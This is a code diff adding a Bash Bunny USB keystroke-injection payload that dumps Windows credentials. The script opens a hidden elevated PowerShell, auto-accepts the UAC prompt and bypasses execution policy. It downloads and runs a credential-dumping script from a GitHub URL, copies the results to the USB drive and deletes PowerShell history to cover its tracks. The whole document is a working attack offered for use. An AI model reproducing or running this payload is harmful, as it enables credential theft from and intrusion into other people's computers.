@@ -1,0 +1,61 @@
+#!/bin/bash
+# Title: Silent Bash Bunny Payload for Dumping Credentials
+# Version: 1.0
+# Author: Spraggins Designs
+# Description: Downloads and runs a PowerShell script to dump credentials silently without GUI
+
+# Set the attack mode to HID and storage
+ATTACKMODE HID STORAGE
+
+# Wait for the system to be ready
+LED SETUP
+DELAY 3000
+
+# Open PowerShell as Administrator silently
+Q STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \"C:\\Temp\\run_script.ps1\"' -Verb runAs -WindowStyle Hidden"
+Q ENTER
+DELAY 1500
+
+# Accept UAC prompt if it appears
+Q ALT y
+DELAY 1500
+
+# Create the PowerShell script to download and run the credential dumping script
+Q STRING $script = @'
+Q ENTER
+Q STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/spragginsdesigns/Win11-PWDump/main/dumpAllCreds.ps1" -OutFile "$env:TEMP\\dumpAllCreds.ps1"
+Q ENTER
+Q STRING & "$env:TEMP\\dumpAllCreds.ps1" > "C:\\Temp\\credentials.txt"
+Q ENTER
+Q STRING '@
+Q ENTER
+
+# Save the script to a temporary file
+Q STRING $script | Out-File -FilePath "C:\\Temp\\run_script.ps1"
+Q ENTER
+DELAY 500
+
+# Run the saved script silently
+Q STRING Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File "C:\\Temp\\run_script.ps1"' -Verb runAs -WindowStyle Hidden
+Q ENTER
+DELAY 1500
+
+# Clean up the temporary script file and any downloaded files (uncomment to activate)
+#Q STRING Remove-Item -Path "C:\\Temp\\run_script.ps1" -Force
+#Q ENTER
+#DELAY 500
+#Q STRING Remove-Item -Path "$env:TEMP\\dumpAllCreds.ps1" -Force
+#Q ENTER
+#DELAY 500
+
+# Move the credentials file to the USB storage for easy retrieval
+Q STRING Move-Item -Path "C:\\Temp\\credentials.txt" -Destination "E:\\credentials.txt" -Force
+Q ENTER
+DELAY 500
+
+# Clear PowerShell history
+Q STRING Remove-Item -Path (Get-PSReadlineOption).HistorySavePath -Force
+Q ENTER
+DELAY 500
+
+LED FINISH
